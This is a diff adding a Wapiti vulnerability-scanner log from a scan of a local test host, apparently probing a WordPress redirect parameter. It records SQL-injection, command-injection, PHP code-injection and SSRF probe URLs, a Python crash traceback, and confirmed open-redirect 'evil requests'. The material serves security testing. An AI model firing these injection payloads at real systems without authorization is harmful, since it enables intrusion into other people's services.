@@ -1,0 +1,850 @@
+2024-03-21 13:56:37.379 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:56:38.162 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/fuzz (1)
+2024-03-21 13:56:38.218 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-21 13:56:38.219 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_2d937a06.db
+2024-03-21 13:56:38.221 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 2 URLs and forms during the scan
+2024-03-21 13:56:38.251 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-21 13:56:38.252 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-21 13:56:38.332 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-21 13:56:38.359 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-21 13:56:38.360 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module csp
+2024-03-21 13:56:38.375 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:56:39.067 | RED      | wapitiCore.attack.mod_csp:attack:58 - CSP is not set
+2024-03-21 13:56:39.154 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module ssrf
+2024-03-21 13:56:39.170 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:56:39.171 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?to=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F6cx4dq%2F1%2F746f%2F&noptin_ns=email_click (0)
+2024-03-21 13:56:39.819 | VERBOSE  | wapitiCore.attack.mod_ssrf:attack:175 - [¨] GET http://web/?to=fuzz&noptin_ns=https%3A%2F%2Fwapiti3.ovh%2Fssrf%2F6cx4dq%2F1%2F6e6f7074696e5f6e73%2F (0)
+2024-03-21 13:56:40.485 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 13:56:40.512 | INFO     | wapitiCore.attack.mod_ssrf:finish:185 - [*] Asking endpoint URL https://wapiti3.ovh/get_ssrf.php?session_id=6cx4dq for results, please wait...
+2024-03-21 13:56:42.777 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module upload
+2024-03-21 13:56:42.828 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-21 13:56:42.843 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:56:42.844 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?to=fuzz%C2%BF%27%22%28&noptin_ns=email_click (0)
+2024-03-21 13:56:43.482 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/?to=fuzz&noptin_ns=fuzz%C2%BF%27%22%28 (0)
+2024-03-21 13:56:44.770 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%20AND%2085%3D110%20AND%2061%3D61&noptin_ns=email_click (0)
+2024-03-21 13:56:45.419 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%20AND%2074%3D154%20AND%2051%3D51&noptin_ns=email_click (0)
+2024-03-21 13:56:46.065 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%20AND%2085%3D85%20AND%2098%3D98&noptin_ns=email_click (0)
+2024-03-21 13:56:46.713 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%20AND%2035%3D116%20AND%20%2787%27%3D%2787&noptin_ns=email_click (0)
+2024-03-21 13:56:47.356 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%20AND%2078%3D92%20AND%20%2749%27%3D%2749&noptin_ns=email_click (0)
+2024-03-21 13:56:48.000 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%20AND%2079%3D79%20AND%20%2784%27%3D%2784&noptin_ns=email_click (0)
+2024-03-21 13:56:48.652 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%20AND%2016%3D45%20AND%20%2244%22%3D%2244&noptin_ns=email_click (0)
+2024-03-21 13:56:49.296 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%20AND%2061%3D72%20AND%20%2245%22%3D%2245&noptin_ns=email_click (0)
+2024-03-21 13:56:49.939 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%20AND%2014%3D14%20AND%20%2255%22%3D%2255&noptin_ns=email_click (0)
+2024-03-21 13:56:50.584 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%29%20AND%2044%3D122%20AND%20%2872%3D72&noptin_ns=email_click (0)
+2024-03-21 13:56:51.234 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%29%20AND%2032%3D111%20AND%20%2894%3D94&noptin_ns=email_click (0)
+2024-03-21 13:56:51.881 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%29%20AND%2046%3D46%20AND%20%2879%3D79&noptin_ns=email_click (0)
+2024-03-21 13:56:52.532 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%29%20AND%2081%3D112%20AND%20%28%2763%27%3D%2763&noptin_ns=email_click (0)
+2024-03-21 13:56:53.175 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%29%20AND%2051%3D64%20AND%20%28%2716%27%3D%2716&noptin_ns=email_click (0)
+2024-03-21 13:56:53.831 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%27%29%20AND%2032%3D32%20AND%20%28%2794%27%3D%2794&noptin_ns=email_click (0)
+2024-03-21 13:56:54.476 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%29%20AND%2097%3D133%20AND%20%28%2272%22%3D%2272&noptin_ns=email_click (0)
+2024-03-21 13:56:55.122 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%29%20AND%2038%3D59%20AND%20%28%2267%22%3D%2267&noptin_ns=email_click (0)
+2024-03-21 13:56:55.763 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz%22%29%20AND%2036%3D36%20AND%20%28%2290%22%3D%2290&noptin_ns=email_click (0)
+2024-03-21 13:56:56.400 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%20AND%2039%3D88%20AND%2016%3D16 (0)
+2024-03-21 13:56:57.051 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%20AND%2096%3D134%20AND%2015%3D15 (0)
+2024-03-21 13:56:57.704 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%20AND%2028%3D28%20AND%2030%3D30 (0)
+2024-03-21 13:56:58.357 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%20AND%2093%3D168%20AND%20%2724%27%3D%2724 (0)
+2024-03-21 13:56:59.013 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%20AND%2082%3D164%20AND%20%2754%27%3D%2754 (0)
+2024-03-21 13:56:59.667 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%20AND%2066%3D66%20AND%20%2762%27%3D%2762 (0)
+2024-03-21 13:57:00.322 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%20AND%2046%3D76%20AND%20%2219%22%3D%2219 (0)
+2024-03-21 13:57:00.968 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%20AND%2092%3D188%20AND%20%2297%22%3D%2297 (0)
+2024-03-21 13:57:01.614 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%20AND%2094%3D94%20AND%20%2227%22%3D%2227 (0)
+2024-03-21 13:57:02.260 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%29%20AND%2083%3D126%20AND%20%2891%3D91 (0)
+2024-03-21 13:57:02.913 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%29%20AND%2061%3D112%20AND%20%2886%3D86 (0)
+2024-03-21 13:57:03.566 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%29%20AND%2062%3D62%20AND%20%2849%3D49 (0)
+2024-03-21 13:57:04.229 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%29%20AND%2055%3D88%20AND%20%28%2724%27%3D%2724 (0)
+2024-03-21 13:57:04.880 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%29%20AND%2064%3D82%20AND%20%28%2724%27%3D%2724 (0)
+2024-03-21 13:57:05.537 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%27%29%20AND%2032%3D32%20AND%20%28%2767%27%3D%2767 (0)
+2024-03-21 13:57:06.188 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%29%20AND%2055%3D65%20AND%20%28%2229%22%3D%2229 (0)
+2024-03-21 13:57:06.834 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%29%20AND%2097%3D166%20AND%20%28%2265%22%3D%2265 (0)
+2024-03-21 13:57:07.477 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/?to=fuzz&noptin_ns=email_click%22%29%20AND%2025%3D25%20AND%20%28%2268%22%3D%2268 (0)
+2024-03-21 13:57:08.131 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 13:57:08.162 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module exec
+2024-03-21 13:57:08.174 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:57:08.175 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 13:57:08.823 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%7Cenv%7C&noptin_ns=email_click (0)
+2024-03-21 13:57:09.470 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 13:57:10.118 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 13:57:10.765 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&noptin_ns=email_click (0)
+2024-03-21 13:57:11.414 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=fuzz%3Benv%3B&noptin_ns=email_click (0)
+2024-03-21 13:57:12.059 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=fuzz%0Aenv%3B&noptin_ns=email_click (0)
+2024-03-21 13:57:12.706 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%26set%26&noptin_ns=email_click (0)
+2024-03-21 13:57:13.350 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=set&noptin_ns=email_click (0)
+2024-03-21 13:57:13.994 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=env&noptin_ns=email_click (0)
+2024-03-21 13:57:14.641 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%2Fe%00&noptin_ns=email_click (0)
+2024-03-21 13:57:15.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 13:57:15.937 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 13:57:17.356 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 13:57:18.000 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 13:57:18.646 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 13:57:19.285 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 13:57:19.926 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 13:57:20.578 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 13:57:21.227 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 13:57:21.870 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 13:57:22.513 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&noptin_ns=email_click (0)
+2024-03-21 13:57:23.160 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&noptin_ns=email_click (0)
+2024-03-21 13:57:23.805 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click (0)
+2024-03-21 13:57:24.450 | ERROR    | wapitiCore.controller.wapiti:attack:520 - InvalidURL
+Traceback (most recent call last):
+
+  File "/usr/local/bin/wapiti", line 8, in <module>
+    sys.exit(wapiti_asyncio_wrapper())
+    │   │    └ <function wapiti_asyncio_wrapper at 0x7da3923a0900>
+    │   └ <built-in function exit>
+    └ <module 'sys' (built-in)>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 395, in wapiti_asyncio_wrapper
+    asyncio.run(wapiti_main())
+    │       │   └ <function wapiti_main at 0x7da3923a0860>
+    │       └ <function run at 0x7da3970af560>
+    └ <module 'asyncio' from '/usr/local/lib/python3.11/asyncio/__init__.py'>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 190, in run
+    return runner.run(main)
+           │      │   └ <coroutine object wapiti_main at 0x7da3925d3240>
+           │      └ <function Runner.run at 0x7da396f36fc0>
+           └ <asyncio.runners.Runner object at 0x7da397a29190>
+  File "/usr/local/lib/python3.11/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           │    │     │                  └ <Task cancelling name='Task-1' coro=<wapiti_main() running at /usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti....
+           │    │     └ <function BaseEventLoop.run_until_complete at 0x7da396f34c20>
+           │    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+           └ <asyncio.runners.Runner object at 0x7da397a29190>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 641, in run_until_complete
+    self.run_forever()
+    │    └ <function BaseEventLoop.run_forever at 0x7da396f34b80>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 608, in run_forever
+    self._run_once()
+    │    └ <function BaseEventLoop._run_once at 0x7da396f36980>
+    └ <_UnixSelectorEventLoop running=True closed=False debug=False>
+  File "/usr/local/lib/python3.11/asyncio/base_events.py", line 1936, in _run_once
+    handle._run()
+    │      └ <function Handle._run at 0x7da397098e00>
+    └ <Handle <TaskStepMethWrapper object at 0x7da390d3b160>()>
+  File "/usr/local/lib/python3.11/asyncio/events.py", line 84, in _run
+    self._context.run(self._callback, *self._args)
+    │    │            │    │           │    └ <member '_args' of 'Handle' objects>
+    │    │            │    │           └ <Handle <TaskStepMethWrapper object at 0x7da390d3b160>()>
+    │    │            │    └ <member '_callback' of 'Handle' objects>
+    │    │            └ <Handle <TaskStepMethWrapper object at 0x7da390d3b160>()>
+    │    └ <member '_context' of 'Handle' objects>
+    └ <Handle <TaskStepMethWrapper object at 0x7da390d3b160>()>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/main/wapiti.py", line 382, in wapiti_main
+    await wap.attack(global_stop_event)
+          │   │      └ <asyncio.locks.Event object at 0x7da396f5b390 [unset]>
+          │   └ <function Wapiti.attack at 0x7da39240e520>
+          └ <wapitiCore.controller.wapiti.Wapiti object at 0x7da39267f590>
+> File "/usr/local/lib/python3.11/site-packages/wapitiCore/controller/wapiti.py", line 503, in attack
+    await attack_module.attack(original_request, original_response)
+          │             │      │                 └ <wapitiCore.net.response.Response object at 0x7da390da3610>
+          │             │      └ GET http://web/?to=fuzz&noptin_ns=email_click (0)
+          │             └ <function ModuleExec.attack at 0x7da390e6c860>
+          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x7da390e74b10>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/attack/mod_exec.py", line 101, in attack
+    response: Response = await self.crawler.async_send(mutated_request)
+    │                          │    │       │          └ GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click (0)
+    │                          │    │       └ <function AsyncCrawler.async_send at 0x7da395d96020>
+    │                          │    └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>
+    │                          └ <wapitiCore.attack.mod_exec.ModuleExec object at 0x7da390e74b10>
+    └ <wapitiCore.net.response.Response object at 0x7da390d49090>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 386, in async_send
+    response = await self.async_get(request, headers=headers,
+                     │    │         │                └ None
+                     │    │         └ GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click (0)
+                     │    └ <function AsyncCrawler.async_get at 0x7da395d96160>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 59, in inner_wrapper
+    value = await function(*args, **kwargs)
+                  │         │       └ {'headers': None, 'follow_redirects': False, 'stream': False, 'timeout': None}
+                  │         └ (<wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>, GET http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMX...
+                  └ <function AsyncCrawler.async_get at 0x7da395d960c0>
+  File "/usr/local/lib/python3.11/site-packages/wapitiCore/net/crawler.py", line 238, in async_get
+    response = await self._client.send(
+                     │    │       └ <function AsyncClient.send at 0x7da3962fd1c0>
+                     │    └ <httpx.AsyncClient object at 0x7da392511610>
+                     └ <wapitiCore.net.crawler.AsyncCrawler object at 0x7da3921f5750>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1617, in send
+    response = await self._send_handling_auth(
+                     │    └ <function AsyncClient._send_handling_auth at 0x7da3962fd260>
+                     └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1645, in _send_handling_auth
+    response = await self._send_handling_redirects(
+                     │    └ <function AsyncClient._send_handling_redirects at 0x7da3962fd300>
+                     └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1703, in _send_handling_redirects
+    raise exc
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 1692, in _send_handling_redirects
+    request = self._build_redirect_request(request, response)
+              │    │                       │        └ <Response [302 Found]>
+              │    │                       └ <Request('GET', 'http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')>
+              │    └ <function BaseClient._build_redirect_request at 0x7da3962efc40>
+              └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 465, in _build_redirect_request
+    url = self._redirect_url(request, response)
+          │    │             │        └ <Response [302 Found]>
+          │    │             └ <Request('GET', 'http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')>
+          │    └ <function BaseClient._redirect_url at 0x7da3962efd80>
+          └ <httpx.AsyncClient object at 0x7da392511610>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_client.py", line 517, in _redirect_url
+    url = url.copy_with(host=request.url.host)
+          │   │              │       │   └ <property object at 0x7da3969ee480>
+          │   │              │       └ URL('http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')
+          │   │              └ <Request('GET', 'http://web/?to=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&noptin_ns=email_click')>
+          │   └ <function URL.copy_with at 0x7da396a0d8a0>
+          └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 348, in copy_with
+    return URL(self, **kwargs)
+           │   │       └ {'host': 'web'}
+           │   └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+           └ <class 'httpx.URL'>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urls.py", line 115, in __init__
+    self._uri_reference = url._uri_reference.copy_with(**kwargs)
+    │                     │   │              │           └ {'host': 'web'}
+    │                     │   │              └ <function ParseResult.copy_with at 0x7da396a0c400>
+    │                     │   └ ParseResult(scheme='data', userinfo='', host='', port=None, path=';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', quer...
+    │                     └ URL('data:;base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==')
+    └ <unprintable URL object>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 134, in copy_with
+    return urlparse("", **defaults)
+           │              └ {'scheme': 'data', 'authority': '', 'path': ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg==', 'query': None, 'fragment'...
+           └ <function urlparse at 0x7da396a0c220>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 252, in urlparse
+    validate_path(path, has_scheme=has_scheme, has_authority=has_authority)
+    │             │                │                         └ True
+    │             │                └ True
+    │             └ ';base64,PD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA/Pg=='
+    └ <function validate_path at 0x7da396a0ca40>
+  File "/usr/local/lib/python3.11/site-packages/httpx/_urlparse.py", line 369, in validate_path
+    raise InvalidURL("For absolute URLs, path must be empty or begin with '/'")
+          └ <class 'httpx.InvalidURL'>
+
+httpx.InvalidURL: For absolute URLs, path must be empty or begin with '/'
+2024-03-21 13:57:24.534 | INFO     | wapitiCore.controller.wapiti:send_bug_report:616 - Wapiti 3.1.8. httpx 0.24.1. OS linux
+2024-03-21 13:57:24.612 | SUCCESS  | wapitiCore.controller.wapiti:send_bug_report:627 - Sending crash report f1ebfac4-e78a-11ee-8ecb-0242ac160004 ... SUCCESS
+2024-03-21 13:57:24.625 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 13:57:24.652 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-21 13:57:24.670 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:57:26.024 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/fuzz (1)
+2024-03-21 13:57:26.050 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module redirect
+2024-03-21 13:57:26.064 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/?to=fuzz&noptin_ns=email_click (0)
+2024-03-21 13:57:26.065 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=https%3A%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click
+2024-03-21 13:57:26.782 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-21 13:57:26.782 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
+2024-03-21 13:57:26.783 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-21 13:57:26.783 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?to=https%3A%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+    accept-language: en-US,en;q=0.5
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+    sec-fetch-user: ?1
+    sec-fetch-site: none
+    sec-fetch-mode: navigate
+    sec-fetch-dest: document
+    upgrade-insecure-requests: 1
+    dnt: 1
+2024-03-21 13:57:26.783 | RED      | wapitiCore.attack.mod_redirect:attack:88 - ---
+2024-03-21 13:57:26.784 | VERBOSE  | wapitiCore.attack.mod_redirect:attack:53 - [¨] http://web/?to=%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click
+2024-03-21 13:57:27.488 | RED      | wapitiCore.attack.mod_redirect:attack:79 - ---
+2024-03-21 13:57:27.489 | RED      | wapitiCore.attack.mod_redirect:attack:80 - Open Redirect in http://web/ via injection in the query string
+2024-03-21 13:57:27.489 | RED      | wapitiCore.attack.mod_redirect:attack:86 - Evil request:
+2024-03-21 13:57:27.489 | RED      | wapitiCore.attack.mod_redirect:attack:87 -     GET /?to=%2F%2Fopenbugbounty.org%2F&noptin_ns=email_click HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/110.0
+    accept-language: en-US,en;q=0.5
